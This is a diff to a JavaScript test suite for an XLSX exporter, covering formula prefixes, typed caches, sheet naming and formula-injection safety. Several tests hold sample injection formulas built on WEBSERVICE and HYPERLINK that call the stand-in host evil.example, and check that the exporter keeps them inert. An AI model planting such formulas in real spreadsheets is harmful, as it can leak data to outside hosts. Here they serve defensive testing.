@@ -44,6 +44,25 @@ module.exports = (h) => {
     assert.strictEqual(XLSX.excelFormula('=ROUND(AVG(B2:B5), 1)'), 'ROUND(AVERAGE(B2:B5), 1)');
   });
 
+  test('xlsx: newer Excel functions receive the OOXML future-function prefix', () => {
+    assert.strictEqual(XLSX.excelFormula('=XLOOKUP(A1,B1:B3,C1:C3)'),
+      '_xlfn.XLOOKUP(A1,B1:B3,C1:C3)');
+    assert.strictEqual(XLSX.excelFormula('=CONCAT("a","b")'), '_xlfn.CONCAT("a","b")');
+    assert.strictEqual(XLSX.excelFormula('="AVG("&"XLOOKUP("&"CONCAT("'),
+      '"AVG("&"XLOOKUP("&"CONCAT("');
+  });
+
+  test('xlsx: typed text and boolean formula caches survive without numeric coercion', () => {
+    const model = CELLS.parseCells(CELLS.serializeCsv([
+      ['Text', 'Bool'],
+      ['=UPPER("ok")', '=AND(TRUE,1)'],
+    ]));
+    const fx = FX.recalc(model);
+    const xml = XLSX.sheetXml(model, fx);
+    assert.ok(xml.indexOf('t="str"><f>UPPER(&quot;ok&quot;)</f><v>OK</v>') >= 0, xml);
+    assert.ok(xml.indexOf('t="b"><f>AND(TRUE,1)</f><v>1</v>') >= 0, xml);
+  });
+
   // ── Worksheet XML ───────────────────────────────────────
   test('xlsx: sheetXml emits numbers, inline strings, and formulas', () => {
     const model = CELLS.parseCells('Item,Qty\nLaptop,12\nTotal,=SUM(B2:B2)');
@@ -62,6 +81,13 @@ module.exports = (h) => {
     assert.ok(xml.indexOf('<b>') < 0, 'no raw markup leaks through');
   });
 
+  test('xlsx: sheetXml removes characters forbidden by XML 1.0', () => {
+    const model = CELLS.parseCells('a\n"before\u0001after"');
+    const xml = XLSX.sheetXml(model, null);
+    assert.ok(xml.indexOf('\u0001') < 0, 'U+0001 would make worksheet XML malformed');
+    assert.ok(xml.indexOf('before') >= 0 && xml.indexOf('after') >= 0, 'surrounding text is preserved');
+  });
+
   test('xlsx: sheetXml skips empty cells and empty rows', () => {
     const model = CELLS.parseCells('a,,c\n,,');
     const xml = XLSX.sheetXml(model, null);
@@ -71,12 +97,12 @@ module.exports = (h) => {
     assert.ok(xml.indexOf('r="A1"') >= 0 && xml.indexOf('r="C1"') >= 0, 'real cells kept');
   });
 
-  test('xlsx: a formula whose evaluation failed emits the formula without a cached value', () => {
+  test('xlsx: a formula error emits a live formula with a typed error cache', () => {
     const model = CELLS.parseCells('a\n=1/0');
     const fx = FX.recalc(model);
     const xml = XLSX.sheetXml(model, fx);
     assert.ok(xml.indexOf('<f>1/0</f>') >= 0, 'formula exported');
-    assert.ok(xml.indexOf('<f>1/0</f><v>') < 0, 'no cached value for an error');
+    assert.ok(xml.indexOf('t="e"><f>1/0</f><v>#DIV/0!</v>') >= 0, 'typed error cache');
   });
 
   // ── Formula laundering (CSV-injection) protection ───────
@@ -98,6 +124,64 @@ module.exports = (h) => {
     assert.ok(xml.indexOf('<f>') < 0, 'no live formulas at all, got: ' + xml);
     assert.ok(xml.indexOf('t="inlineStr"') >= 0, 'payloads exported as inline strings');
     assert.ok(xml.indexOf('WEBSERVICE') >= 0, 'payload text still visible (inert)');
+  });
+
+  test('xlsx: export safety inspects unknown functions in unchosen IF branches', () => {
+    // A numeric result does not prove the entire AST is safe: IF is lazy, so
+    // the current value can avoid a dangerous branch that becomes live after
+    // the user changes A2 in Excel.
+    const payloads = [
+      '=IF(A2,1,WEBSERVICE(B2))',
+      '=IF(A2,1,HYPERLINK(B2))',
+    ];
+    const src = CELLS.serializeCsv([
+      ['Flag', 'URL', 'Result'],
+      ['1', 'https://evil.example', payloads[0]],
+      ['1', 'https://evil.example', payloads[1]],
+    ]);
+    const model = CELLS.parseCells(src);
+    const fx = FX.recalc(model);
+    const xml = XLSX.sheetXml(model, fx);
+    assert.strictEqual(fx[1][2].value, 1, 'fixture reaches the safe IF branch today');
+    assert.strictEqual(fx[2][2].value, 1, 'second fixture reaches the safe IF branch today');
+    assert.ok(xml.indexOf('<f>') < 0, 'unknown functions anywhere in the AST stay inert');
+    payloads.forEach((payload) => {
+      assert.ok(xml.indexOf(payload) >= 0, 'payload remains visible as inert text');
+    });
+  });
+
+  test('xlsx: a literal #REF! cannot stop validation before a dangerous suffix', () => {
+    // formulaSelfContained historically read #REF! as a reference to a sheet
+    // named REF. Include that sheet so the regression exercises the complete
+    // build path, not only sheetXml without workbook context.
+    const ref = CELLS.parseCells('x\n1');
+    const out = CELLS.parseCells(CELLS.serializeCsv([
+      ['URL', 'Result'],
+      ['https://evil.example', '=IFERROR(#REF!,WEBSERVICE(A2))'],
+    ]));
+    const sheets = [{ name: 'REF', model: ref }, { name: 'Out', model: out }];
+    const grids = FX.recalcWorkbook(sheets);
+    const s = bytesToStr(XLSX.buildXlsxWorkbook(sheets, grids));
+    assert.ok(s.indexOf('<f>IFERROR') < 0, 'the unparsed suffix never becomes a live formula');
+    assert.ok(s.indexOf('=IFERROR(#REF!') >= 0, 'payload remains visible as inert text');
+  });
+
+  test('xlsx: formulas depending on inert formulas also stay inert', () => {
+    const model = CELLS.parseCells(CELLS.serializeCsv([
+      ['Unsafe', 'Dependent'],
+      ['=IF(TRUE,1,WEBSERVICE(A1))', '=A2+1'],
+    ]));
+    const fx = FX.recalc(model);
+    const xml = XLSX.sheetXml(model, fx);
+    assert.strictEqual(fx[1][1].safe, false);
+    assert.ok(xml.indexOf('<f>') < 0, xml);
+    assert.ok(xml.indexOf('=A2+1') >= 0, 'dependent remains visible and inert');
+  });
+
+  test('xlsx: malformed numeric formulas stay inert', () => {
+    const model = CELLS.parseCells(CELLS.serializeCsv([['=1.2.3', '=1e', '=1e+']]));
+    const xml = XLSX.sheetXml(model, FX.recalc(model));
+    assert.ok(xml.indexOf('<f>') < 0, xml);
   });
 
   test('xlsx: without evaluation results (fx=null) formulas export as text, not live', () => {
@@ -139,6 +223,13 @@ module.exports = (h) => {
     assert.ok(xml.indexOf('$#,##0.00') >= 0, 'currency format code');
     assert.ok(xml.indexOf('%') >= 0, 'percent format code');
     assert.ok(xml.indexOf('<cellXfs') >= 0, 'cell format records');
+  });
+
+  test('xlsx: stylesXml preserves the requested currency symbol', () => {
+    const gbp = XLSX.stylesXml(CELLS.parseCells('format: A=£\nvalue\n1.25'));
+    const eur = XLSX.stylesXml(CELLS.parseCells('format: A=€\nvalue\n1.25'));
+    assert.ok(gbp.indexOf('£#,##0.00') >= 0, 'GBP does not become dollars');
+    assert.ok(eur.indexOf('€#,##0.00') >= 0, 'EUR does not become dollars');
   });
 
   // ── The full workbook (ZIP) ─────────────────────────────
@@ -221,6 +312,10 @@ module.exports = (h) => {
     assert.strictEqual(XLSX.sanitizeSheetName('X'.repeat(40)).length, 31);
     assert.strictEqual(XLSX.sanitizeSheetName(''), 'Sheet');
     assert.deepStrictEqual(XLSX.dedupeSheetNames(['Data', 'data', 'DATA']), ['Data', 'data~2', 'DATA~3']);
+    const emoji = '😀'.repeat(31);
+    const deduped = XLSX.dedupeSheetNames([emoji, emoji]);
+    assert.strictEqual(Array.from(deduped[1]).length, 31);
+    assert.ok(deduped[1].indexOf('\uFFFD') < 0, deduped[1]);
   });
 
   test('xlsx: a cross-sheet formula stays a live formula pointing at its sibling tab', () => {
@@ -229,6 +324,32 @@ module.exports = (h) => {
     const grids = FX.recalcWorkbook([{ name: 'Drivers', model: drv }, { name: 'Model', model: mdl }]);
     const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'Drivers', model: drv }, { name: 'Model', model: mdl }], grids));
     assert.ok(s.indexOf('<f>Drivers!A2*2</f>') >= 0, 'cross-sheet reference exported as a live formula');
+  });
+
+  test('xlsx: duplicate sheet references keep the evaluator first-wins target', () => {
+    const first = CELLS.parseCells('x\n100');
+    const second = CELLS.parseCells('x\n200');
+    const ref = CELLS.parseCells('result\n=Dup!A2');
+    const sheets = [
+      { name: 'Dup', model: first },
+      { name: 'Dup', model: second },
+      { name: 'Ref', model: ref },
+    ];
+    const grids = FX.recalcWorkbook(sheets);
+    const s = bytesToStr(XLSX.buildXlsxWorkbook(sheets, grids));
+    assert.strictEqual(grids[2][1][0].value, 100, 'local evaluator resolves the first Dup sheet');
+    assert.ok(s.indexOf('<f>Dup!A2</f><v>100</v>') >= 0,
+      'exported formula and cache point to the same first sheet');
+    assert.ok(s.indexOf("<f>'Dup~2'!A2</f>") < 0, 'reference is not silently redirected to the de-duped tab');
+  });
+
+  test('xlsx: a named single sheet exports self-references to its real tab name', () => {
+    const model = CELLS.parseCells('sdoc-cells: name="Sales"\nResult\n=Sales!A3*2\n5');
+    const fx = FX.recalcWorkbook([{ name: 'Sales', model }])[0];
+    const s = bytesToStr(XLSX.buildXlsx(model, fx));
+    assert.strictEqual(fx[1][0].value, 10, 'fixture resolves through the named sheet');
+    assert.ok(s.indexOf('<sheet name="Sales"') >= 0, 'workbook tab uses the logical sheet name');
+    assert.ok(s.indexOf('<f>Sales!A3*2</f><v>10</v>') >= 0, 'self-reference targets that exported tab');
   });
 
   test('xlsx: a renamed/spaced target tab gets single-quoted in the formula', () => {
